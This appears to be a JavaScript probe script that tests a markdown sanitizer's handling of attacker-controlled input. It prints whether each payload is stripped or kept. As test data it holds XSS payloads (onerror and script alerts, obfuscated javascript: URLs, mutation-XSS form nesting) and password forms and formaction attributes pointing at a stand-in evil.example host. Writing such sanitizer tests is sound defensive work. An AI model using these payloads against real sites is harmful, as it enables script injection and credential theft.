// Runtime probe for web/src/util/markdown.ts, review round 5 (TEST leg).
//
// Loads the COMPILED sanitizer under the same jsdom bootstrap markdown.test.ts
// uses, so results are comparable with the suite's. Used for two things:
//   1. runtime-verifying that a mutation actually renders attacker markup raw
//      (a green suite is not evidence of a vulnerability by itself);
//   2. input-domain variation — inputs the existing fixtures cannot express.
//
// Run from web/:  npx tsc -p tsconfig.test.json && node <this file>
import { JSDOM } from 'jsdom';
const dom = new JSDOM('');
globalThis.window = dom.window;
globalThis.document = dom.window.document;

const { renderMarkdown } = await import('./.tmp-test/util/markdown.js');

const XSS = '<img src=x onerror=alert(1)><script>alert(2)</script>';

function show(label, out) {
  const bad = /onerror|<script/i.test(out);
  console.log(`${bad ? 'RAW ' : 'safe'}  ${label}\n        ${JSON.stringify(out)}`);
  return bad;
}

console.log('--- arity: the input domain no fixture supplies ---');
show('renderMarkdown(XSS)                    [1 arg, the only shape tested]', renderMarkdown(XSS));
show('renderMarkdown(XSS, { inline: true })  [2 args, unreachable by any fixture]',
     renderMarkdown(XSS, { inline: true }));

console.log('\n--- FORBID_ATTR: is formaction/action really untestable in isolation? ---');
for (const md of [
  '<a href="#" formaction="https://evil.example">x</a>',
  '<a href="#" action="https://evil.example">x</a>',
  '<img src="x" formaction="https://evil.example">',
  '<div action="https://evil.example">x</div>',
]) {
  const out = renderMarkdown(md);
  const kept = /formaction|(?<![a-z])action=/i.test(out);
  console.log(`${kept ? 'KEPT' : 'gone'}  ${md}\n        ${JSON.stringify(out)}`);
}

console.log('\n--- input-domain: non-string inputs the components can actually deliver ---');
for (const [label, v] of [
  ['undefined', undefined], ['null', null], ['number', 42],
  ['object with toString', { toString: () => XSS }],
  ['array', ['a', 'b']],
]) {
  try {
    const out = renderMarkdown(v);
    console.log(`ok    ${label} -> ${JSON.stringify(out)}`);
  } catch (e) {
    console.log(`THROW ${label} -> ${e.constructor.name}: ${String(e.message).slice(0, 90)}`);
  }
}

console.log('\n--- input-domain: attribute-name case + SVG namespace for FORBID_ATTR ---');
for (const md of [
  '<div STYLE="position:fixed">x</div>',
  '<div CLASS="comment-header">x</div>',
  '<svg><rect class="comment-header" width="9"></rect></svg>',
  '<svg><rect style="position:fixed" width="9"></rect></svg>',
  '<a href="https://x.example" DOWNLOAD="invoice.pdf">d</a>',
]) {
  const out = renderMarkdown(md);
  const kept = /style=|class=|download=/i.test(out);
  console.log(`${kept ? 'KEPT' : 'gone'}  ${md}\n        ${JSON.stringify(out)}`);
}

console.log('\n--- input-domain: forging the task-list glyph from attacker markdown ---');
console.log(JSON.stringify(renderMarkdown('- ☑︎ looks done but is not')));

console.log('\n--- input-domain: markdown constructs that reach raw HTML, untested shapes ---');
for (const md of [
  '<template><form action="https://evil.example"><input type=password></form></template>',
  '[x]: https://evil.example "t"\n\n[x]',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<img srcset="https://evil.example/1.png 1x" src="data:,">',
  '<form><math><mtext><form><input name=t type=password>',
]) {
  const out = renderMarkdown(md);
  console.log(`      ${JSON.stringify(md)}\n        ${JSON.stringify(out)}`);
}
